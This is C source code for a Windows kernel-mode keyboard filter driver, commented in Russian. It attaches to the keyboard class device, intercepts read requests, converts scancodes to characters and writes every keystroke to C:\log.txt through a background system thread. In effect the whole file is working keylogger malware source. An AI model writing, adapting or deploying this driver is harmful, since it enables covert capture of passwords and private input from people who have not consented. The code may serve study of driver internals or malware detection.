#include "Source.h"
#include "ScanCodes.h"

static int REQUESTS = 0; //число необработанных IRP-пакетов (запросов)

//Процедура завершения обработки IRP-пакета
NTSTATUS ReadCompleted(PDEVICE_OBJECT pDeviceObject, PIRP pIrp, PVOID Context)
{
	PDEVICE_EXTENSION pDeviceExtension = (PDEVICE_EXTENSION)pDeviceObject->DeviceExtension;
	
	//Проверяем статус пакета 
	if (pIrp->IoStatus.Status == STATUS_SUCCESS)
	{
		PKEYBOARD_INPUT_DATA keys = (PKEYBOARD_INPUT_DATA)pIrp->AssociatedIrp.SystemBuffer;
		//Получаем количество клавиш
		int nKeys = pIrp->IoStatus.Information / sizeof(KEYBOARD_INPUT_DATA);
		for (int i = 0; i < nKeys; ++i)
		{		
				DbgPrint("Scanсode: %x\n", keys[i].MakeCode);

				if (keys[i].Flags == KEY_BREAK)
					DbgPrint("Key up\n");

				if (keys[i].Flags == KEY_MAKE)
					DbgPrint("Key down\n");

				//Выделяем пул неперемещаемой памяти и помещаем его в список
				KEY_DATA* kData = (KEY_DATA*)ExAllocatePool(NonPagedPool, sizeof(KEY_DATA));
				kData->keyData = (char)keys[i].MakeCode;
				kData->keyFlags = (char)keys[i].Flags;

				//Вставляем узел в конец списка (используется спинлок)
				ExInterlockedInsertTailList(&pDeviceExtension->listHead,
											&kData->listNode,
											&pDeviceExtension->spinlock);
				//Увеличиваем счётчик семафора на 1
				KeReleaseSemaphore(&pDeviceExtension->semaphore,
									0,
									1,
									FALSE);
				
			//}
		}
	}

	//Если IRP задержан
	if (pIrp->PendingReturned)
		IoMarkIrpPending(pIrp);

	//Уменьшаем количество пакетов
	--REQUESTS;
	return pIrp->IoStatus.Status;
}

//Обработчик всех IRP пакетов, кроме IRP_MJ_READ
NTSTATUS DispatchSkip(PDEVICE_OBJECT pDeviceObject, PIRP pIrp)
{
	//Отправляем IRP пакет ниже по стеку, не изменяя его
	IoSkipCurrentIrpStackLocation(pIrp);
	return IoCallDriver(((PDEVICE_EXTENSION)pDeviceObject->DeviceExtension)->pKeyboardDevice, pIrp);
}

//Обработчик пакетов IRP_MJ_READ
NTSTATUS DispatchRead(PDEVICE_OBJECT pDeviceObject, PIRP pIrp)
{
	//Настраиваем IRP-пакет так, чтобы указатель на структуру IO_STACK_LOCATION не менялся
	IoCopyCurrentIrpStackLocationToNext(pIrp);

	//Задаём процедуру завершения, которая будет вызвана после того, как IRP-пакет вернётся
	//по стеку обратно с записанным скан-кодом
	IoSetCompletionRoutine(pIrp,
							ReadCompleted,
							pDeviceObject,
							TRUE,
							TRUE,
							TRUE);

	//Увеличиваем количество IRP-пакетов
	++REQUESTS;

	//Передаём IRP-пакет следующему драйверу
	//pKeyboardDevice - указатель на следующий драйвер в цепочке
	return IoCallDriver(((PDEVICE_EXTENSION)pDeviceObject->DeviceExtension)->pKeyboardDevice, pIrp);
}

//Установка устройства в стек
NTSTATUS InitializeKeyboardFilter(PDRIVER_OBJECT pDriverObject)
{
	PDEVICE_OBJECT pDeviceObject;
	NTSTATUS NtStatus = 0;

	//Создаём объект устройства
	NtStatus = IoCreateDevice(pDriverObject,
							sizeof(DEVICE_EXTENSION),
							NULL,
							FILE_DEVICE_KEYBOARD,	//Тип устройства
							0,
							TRUE,
							&pDeviceObject);

	if (NtStatus != STATUS_SUCCESS) {
		DbgPrint("Keyboard filter installation failed\n");
		return NtStatus;
	}

	//Установка флагов
	pDeviceObject->Flags |= (DO_BUFFERED_IO | DO_POWER_PAGABLE);
	pDeviceObject->Flags &= (~DO_DEVICE_INITIALIZING);

	//Обнуляем струтуру DeviceExtension и получаем указатель на выделенную память
	RtlZeroMemory(pDeviceObject->DeviceExtension, sizeof(DEVICE_EXTENSION));
	PDEVICE_EXTENSION pDeviceExtension = (PDEVICE_EXTENSION)pDeviceObject->DeviceExtension;

	//Преобразование имени устройства
	CCHAR cName[40] = "\\Device\\KeyboardClass0";
	STRING strName;
	UNICODE_STRING ustrDeviceName;
	RtlInitAnsiString(&strName, cName);
	RtlAnsiStringToUnicodeString(&ustrDeviceName, &strName, TRUE);

	//Добавляем устройство в стек
	IoAttachDevice(pDeviceObject,
					&ustrDeviceName,
					&pDeviceExtension->pKeyboardDevice); // здесь хранится адрес нижележащего устройства
	//Освобождаем место, выделенное под строку
	RtlFreeUnicodeString(&ustrDeviceName);		
	DbgPrint("Keyboard filter installed\n");
	return NtStatus;
}

//Поток для записи в файл
VOID ThreadForWriting(PVOID pContext)
{
	PDEVICE_EXTENSION pDeviceExtension = (PDEVICE_EXTENSION)pContext;
	PLIST_ENTRY pListEntry;
	KEY_DATA* kData;

	while (TRUE)
	{
		//Ждём освобождения семафора.
		//Если семафор ненулевой, процесс продолжает работу
		KeWaitForSingleObject(&pDeviceExtension->semaphore,
								Executive,
								KernelMode,
								FALSE,
								NULL);
		//Извлекаем первый элемент списка (используется спинлок)
		pListEntry = ExInterlockedRemoveHeadList(&pDeviceExtension->listHead,
												&pDeviceExtension->spinlock);
		//Должен ли поток уничтожить себя?
		if (pDeviceExtension->bClosedThread == TRUE)
		{
			PsTerminateSystemThread(STATUS_SUCCESS);
		}
		//Получаем адрес структуры по адресу поля
		kData = CONTAINING_RECORD(pListEntry, KEY_DATA, listNode);
		//Преобразуем сканкод в код клавиши
		char keys[3] = { 0 };
		Scancode2Key(pDeviceExtension, kData, keys);

		//Если есть данные и хэндл верный
		if ( (keys != 0) && (pDeviceExtension->hLog != NULL) )
		{
				//Битовый сдвиг для записи в конец файла
				LARGE_INTEGER offset;
				offset.HighPart = -1;
				offset.LowPart = FILE_WRITE_TO_END_OF_FILE;

				//Записываем в файл
				IO_STATUS_BLOCK ioStatus;
				NTSTATUS NtStatus = ZwWriteFile(
									pDeviceExtension->hLog,
									NULL,
									NULL,
									NULL,
									&ioStatus,
									&keys,		//Записываемые данные
									strlen(keys),
									&offset,
									NULL);

				if (NtStatus != STATUS_SUCCESS)
					DbgPrint("Writing scancode failed\n");
		}
	}
	return;
}

//Функция инициализации потока
NTSTATUS InitializeThread(PDRIVER_OBJECT pDriverObject)
{
	PDEVICE_EXTENSION pDeviceExtension = (PDEVICE_EXTENSION)pDriverObject->DeviceObject->DeviceExtension;

	//Переменная, отвечающая за работу потока
	pDeviceExtension->bClosedThread = FALSE;
	//Создаём поток
	HANDLE hThread;
	NTSTATUS NtStatus = PsCreateSystemThread(&hThread,
											(ACCESS_MASK)0,
											NULL,
											(HANDLE)0,
											NULL,
											ThreadForWriting,	//Точка входа потока
											pDeviceExtension);	//Передаваемый параметр
	if (NtStatus != STATUS_SUCCESS) 
	{
		DbgPrint("Thread initializing error\n");
		return NtStatus;
	}

	//Сохраняем указатель на объект потока в структуре DEVICE_EXTENSION
	ObReferenceObjectByHandle(hThread,
							THREAD_ALL_ACCESS,
							NULL,
							KernelMode,
							(PVOID*)&pDeviceExtension->pThreadObj, //Указатель на объект потока
							NULL);
	//Закрываем хэндл
	ZwClose(hThread);
	DbgPrint("Thread initialized\n");
	return NtStatus;
	
}

//Создание списка и файла для записи
NTSTATUS CreateListAndFile(PDRIVER_OBJECT pDriverObject)
{
	NTSTATUS NtStatus = 0;
	PDEVICE_EXTENSION pDeviceExtension = (PDEVICE_EXTENSION)pDriverObject->DeviceObject->DeviceExtension;
	
	//Создаём двусвязный список
	InitializeListHead(&pDeviceExtension->listHead);
	//Инициализируем спинлок для доступа к списку
	//и семафор для отслеживания символов в очереди
	KeInitializeSpinLock(&pDeviceExtension->spinlock);
	KeInitializeSemaphore(&pDeviceExtension->semaphore, 0, MAXLONG);

	//Определяем аттрибуты и путь к файлу
	IO_STATUS_BLOCK fileStatus;
	OBJECT_ATTRIBUTES objAttr;
	CCHAR cName[64] = "\\DosDevices\\C:\\log.txt";
	STRING strName;
	UNICODE_STRING ustrFileName;
	
	RtlInitAnsiString(&strName, cName);
	RtlAnsiStringToUnicodeString(&ustrFileName, &strName, TRUE);
	InitializeObjectAttributes(&objAttr,
								&ustrFileName,
								OBJ_CASE_INSENSITIVE,
								NULL,
								NULL);
	//Создаём файл
	NtStatus = ZwCreateFile(&pDeviceExtension->hLog,
							GENERIC_WRITE,
							&objAttr,
							&fileStatus,
							NULL,
							FILE_ATTRIBUTE_NORMAL,
							0,
							FILE_OPEN_IF,	//Открывает или создаёт файл, если его нет
							FILE_SYNCHRONOUS_IO_NONALERT,
							NULL,
							0);

	//Освобождаем память, выделенную под строку
	RtlFreeUnicodeString(&ustrFileName);

	if (NtStatus == STATUS_SUCCESS)
	{
		DbgPrint("File was successfully created\n");
	}
	else
	{
		DbgPrint("Failed to create file\n");
	}
	return NtStatus;

}

//Преобразование скан-кодов в клавиши
char* Scancode2Key(PDEVICE_EXTENSION pDeviceExtension, KEY_DATA* kData, char* keys)
{
	char key;

	//Получаем скан-код клавиши
	key = lowerKeys[kData->keyData];

	switch(key)
	{
		case LSHIFT:
			if (kData->keyFlags == KEY_MAKE)	//Если клавиша нажата
				pDeviceExtension->shift = TRUE;
			else
				pDeviceExtension->shift = FALSE;
			break;

		case RSHIFT:
			if (kData->keyFlags == KEY_MAKE)	//Если клавиша нажата
				pDeviceExtension->shift = TRUE;
			else
				pDeviceExtension->shift = FALSE;
			break;

		case ENTER:
			if (kData->keyFlags == KEY_MAKE)	//Если клавиша нажата
			{
				keys[0] = 0x0D;
				keys[1] = 0x0A;
			}
			break;

		default:
			if (kData->keyFlags == KEY_MAKE)	//Если клавиша нажата
			{
				if (pDeviceExtension->shift == TRUE) //Если нажат shift
					keys[0] = upperKeys[kData->keyData];
				else
					keys[0] = lowerKeys[kData->keyData];
			}
	}
	return keys;
}

//Входная точка
NTSTATUS DriverEntry(PDRIVER_OBJECT pDriverObject, PUNICODE_STRING pRegistryPath)
{
	DbgPrint("Entering driver entry point\n");

	NTSTATUS NtStatus = 0; //STATUS_SUCCESS;
	unsigned int i = 0;

	//Устанавливаем обработчики запросов по умолчанию 
	for (i = 0; i < IRP_MJ_MAXIMUM_FUNCTION; ++i)
	{
		//DispatchSkip - отправляем IRP пакет ниже по стеку
		pDriverObject->MajorFunction[i] = DispatchSkip;
	}
	//DispatchRead - перехватываем запросы на чтение клавиатуры
	pDriverObject->MajorFunction[IRP_MJ_READ] = DispatchRead;

	//Помещаем наше устройство в стек.
	NtStatus = InitializeKeyboardFilter(pDriverObject);

	/*
	*	Поскольку процедура DispatchRead выполняется на IRQL уровне DISPATCH_LEVEL, то все
	*	файловые операции в этот момент запрещены. Чтобы обойти это ограничение,
	*	создадим поток, который будет работать на IRQL уровне PASSIVE_LEVEL, получать
	*	нажатия через общий список и записывать их в файл.
	*/
	NtStatus |= InitializeThread(pDriverObject);

	//Создаём список и файл для записи
	NtStatus |= CreateListAndFile(pDriverObject);

	//Функция выгрузки драйвера из памяти
	pDriverObject->DriverUnload = Unload;

	DbgPrint("Exiting driver entry point\n");
	return NtStatus;
}

//Функция выгрузки драйвера
VOID Unload(PDRIVER_OBJECT pDriverObject)
{
	DbgPrint("Entering unload\n");
	PDEVICE_EXTENSION pDeviceExtension = (PDEVICE_EXTENSION)pDriverObject->DeviceObject->DeviceExtension;

	//Убираем устройство из стека
	IoDetachDevice(pDeviceExtension->pKeyboardDevice);

	//Ожидаем окончание обработки пакетов
	KTIMER timer;
	LARGE_INTEGER timeout;
	timeout.QuadPart = 1000000; // 0,1 c
	KeInitializeTimer(&timer);
	while (REQUESTS > 0)
	{
		KeSetTimer(&timer, timeout, NULL);
		KeWaitForSingleObject(&timer,
							Executive,
							KernelMode,
							FALSE,
							NULL);
	}
	//Устанавливаем флаг завершения потока и увеличиваем счётчик семафора на 1
	pDeviceExtension->bClosedThread = TRUE;
	KeReleaseSemaphore(&pDeviceExtension->semaphore,
						0,
						1,
						TRUE);
	//Вызываем поток и ждём его уничтожения
	KeWaitForSingleObject(pDeviceExtension->pThreadObj,
						Executive,
						KernelMode,
						FALSE,
						NULL);
	//Закрываем файл
	ZwClose(pDeviceExtension->hLog);
	//Удаляем устройство
	IoDeleteDevice(pDriverObject->DeviceObject);
	return;
}